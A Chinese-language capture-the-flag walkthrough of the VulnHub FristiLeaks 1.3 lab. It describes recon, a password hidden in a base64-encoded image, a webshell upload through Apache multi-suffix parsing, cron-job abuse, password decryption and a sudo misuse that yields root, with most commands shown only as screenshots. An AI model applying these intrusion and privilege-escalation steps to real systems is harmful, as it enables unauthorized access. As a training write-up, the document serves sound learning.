src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307213101589.png" alt="image-20230307213101589"></p><p>综上，只开放了一个80端口，开启了apache服务，apache2.2.15+php5.3.3，linux操作系统，后台目录有&#x2F;cola,&#x2F;robots.txt,&#x2F;images,&#x2F;sisi,&#x2F;beer.</p><p>先访问web界面：</p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307213538737.png" alt="image-20230307213538737"></p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307213600829.png" alt="image-20230307213600829"></p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307213610628.png" alt="image-20230307213610628"></p><p>查看源代码：</p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307213726384.png" alt="image-20230307213726384"></p><p>均无有效信息。</p><p>接下来尝试寻找php+apache漏洞。</p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307213811701.png" alt="image-20230307213811701"></p><p>前两个版本均符合，尝试利用。</p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307213906097.png" alt="image-20230307213906097"></p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307213932426.png" alt="image-20230307213932426"></p><p>404.无cgi页面。</p><p>第二个脚本利用结果同样如此：</p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307214017727.png" alt="image-20230307214017727"></p><p>404 not found.</p><p>继续从web页面寻找突破，根据首页的图片，尝试访问&#x2F;fristi:</p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307214232322.png" alt="image-20230307214232322"></p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307214806121.png" alt="image-20230307214806121"></p><p>经过简单的手注之后，无果，直接sqlmap：</p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307214431409.png" alt="image-20230307214431409"></p><p>不存在sql注入。</p><p>爆破弱口令同样失败。</p><p>查看源代码，发现提示：</p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307214859613.png" alt="image-20230307214859613"></p><p>作者名为eezeepz，并且使用了base64加密图片，往下飞发现base64密文：</p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307214950977.png" alt="image-20230307214950977"></p><p>base64解密，发现文件头PNG：</p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307215107490.png" alt="image-20230307215107490"></p><p>保存为png查看：</p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307215246674.png" alt="image-20230307215246674"></p><p>发现一串密码，keKkeKKeKKeKkEkkEk，登录：</p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307215418880.png" alt="image-20230307215418880"></p><p>登录成功，来到文件上传页面。</p><p>上传正常jpg文件，成功：</p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307215630815.png" alt="image-20230307215630815"></p><p>访问&#x2F;uploads&#x2F;conan.jpg:</p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307215658986.png" alt="image-20230307215658986"></p><p>正常。</p><p>写马，改后缀：</p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307220022189.png" alt="image-20230307220022189"></p><p>失败，校验了后缀名，只能为png,jpg,gif。</p><p>考虑到apache版本为2.2.15，存在多后缀解析漏洞，直接加后缀：</p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307220110652.png" alt="image-20230307220110652"></p><p>成功，蚁剑连接：</p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307220139843.png" alt="image-20230307220139843"></p><p>为低权限，apache，home目录下有3个用户，admin,eezeepz,fristigod:</p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307220407606.png" alt="image-20230307220407606"></p><p>除了eezeepz目录，都没有权限访问，在eezeepz目录下发现notes.txt:</p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307220524600.png" alt="image-20230307220524600"></p><p>可以发现如下信息：</p><p>作者jerry，即为&#x2F;home&#x2F;admin，该目录下有chmod,df,cat,echo,ps,grep,egrep等命令可以使用，在&#x2F;tmp&#x2F;目录下新建一个runthis文件，该文件里的内容会以admin的权限每分钟运行一次，结果保存在&#x2F;tmp&#x2F;cronresult中。</p><p>首先想到的是chmod命令，改变&#x2F;home&#x2F;admin权限：</p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307221710113.png" alt="image-20230307221710113"></p><p>此时已经能够访问&#x2F;admin目录。</p><p>查看文件内容：</p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307221828145.png" alt="image-20230307221828145"></p><p>从命名看出，cryptedpass.txt为加密后的密文，而cryptpass.py为加密脚本。</p><p>编写解密函数：</p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307222312005.png" alt="image-20230307222312005"></p><p>解密得到明文：</p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307222356135.png" alt="image-20230307222356135"></p><p>可能是某个用户的密码，尝试su：</p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307222439699.png" alt="image-20230307222439699"></p><p>先tty：</p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307222639878.png" alt="image-20230307222639878"></p><p>蚁剑的虚拟终端无法成功，先传shell到kali，再用python：</p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307222841090.png" alt="image-20230307222841090"></p><p>成功拿到fristigod权限。</p><p>sudo -l：</p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307223028627.png" alt="image-20230307223028627"></p><p>提示可以使用该 “doCom” 执行任何命令。</p><p>访问文件：</p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307223554288.png" alt="image-20230307223554288"></p><p>为二进制文件。</p><p>有提示.&#x2F;program_name terminal_command.</p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307223705185.png" alt="image-20230307223705185"></p><p>来到同级目录，查看history文件，用法为sudo -u fristi &#x2F;var&#x2F;fristigod&#x2F;.secret_admin_stuff&#x2F;doCom &lt;command&gt;</p><p>因此直接起新的终端：</p><p><img src="/2023/04/26/vulnhub-FristiLeaks-1-3/image-20230307223841372.png" alt="image-20230307223841372"></p><p>拿到root权限，获取flag。</p>]]></content>
    
    
